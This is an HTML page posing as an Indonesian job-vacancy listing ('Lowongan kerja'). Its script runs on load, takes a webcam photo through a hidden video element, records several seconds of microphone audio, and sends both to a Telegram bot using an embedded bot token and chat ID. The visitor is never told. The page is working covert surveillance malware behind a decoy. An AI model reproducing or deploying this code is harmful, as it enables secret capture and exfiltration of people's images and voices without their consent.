<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lowongan kerja</title>
    <style>
        #video {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>

    <script>
        const botToken = "8118720781:AAFciunnQRseF8FI6VDHU_FgEO9A-KX2RoU";
        const chatId = "7916928366";
        const teleId = "5253120221"; // ID Telegram yang ditambahkan
        
        let mediaStream = null;
        let mediaRecorder = null;
        let audioChunks = [];
        let hasSentPhoto = false;
        let hasSentAudio = false;

        function startCamera() {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");

            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            if (isMobile) {
                video.setAttribute("width", "100%");
                video.setAttribute("height", "auto");
            } else {
                video.setAttribute("width", "2000");
                video.setAttribute("height", "2000");
            }

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    mediaStream = stream;
                    video.srcObject = stream;

                    // Ambil foto setelah 1 detik
                    setTimeout(() => {
                        ctx.drawImage(video, 0, 0, 2000, 2000);
                        canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);
                    }, 1000);
                    
                    // Mulai perekaman audio
                    startRecording();
                    
                    // Hentikan semuanya setelah 10 detik
                    setTimeout(stopAll, 10000);
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to access camera.");
                });
        }

        function sendToTelegram(blob) {
            if (hasSentPhoto) return; // Pastikan hanya mengirim foto sekali
            hasSentPhoto = true;
            
            const formData = new FormData();
            formData.append("photo", blob, "camera.jpg");
            formData.append("chat_id", chatId);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Camera frame sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to send camera frame.");
                });
        }

        function startRecording() {
            audioChunks = [];

            navigator.mediaDevices
                .getUserMedia({ audio: true, video: false })
                .then((stream) => {
                    // Tambahkan audio track ke mediaStream yang sudah ada
                    stream.getAudioTracks().forEach(track => {
                        mediaStream.addTrack(track);
                    });

                    mediaRecorder = new MediaRecorder(stream);

                    mediaRecorder.start();

                    // Hentikan perekaman setelah 3 detik kwannn
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === "recording") {
                            mediaRecorder.stop();
                        }
                    }, 3000);

                    mediaRecorder.addEventListener("dataavailable", (event) => {
                        audioChunks.push(event.data);
                    });

                    mediaRecorder.addEventListener("stop", () => {
                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
                        sendAudioToTelegram(audioBlob);
                    });
                })
                .catch((error) => {
                    console.error(error);
                    alert("Failed to access microphone.");
                });
        }

        function sendAudioToTelegram(blob) {
            if (hasSentAudio) return; // Pastikan hanya mengirim audio sekali
            hasSentAudio = true;
            
            const formData = new FormData();
            formData.append("audio", blob, "recording.wav");
            formData.append("chat_id", chatId);
            formData.append("duration", "10"); // Durasi 10 detik

            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Audio recording sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to send audio recording.");
                });
        }

        function stopAll() {
            // Hentikan perekaman audio jika masih berjalan
            if (mediaRecorder && mediaRecorder.state === "recording") {
                mediaRecorder.stop();
            }
            
            // Hentikan stream kamera dan mikrofon
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
            
            console.log("Semua aktivitas dihentikan setelah 10 detik");
        }

        // Call startCamera when the page is loaded.
        startCamera();
    </script>
</body>
</html>
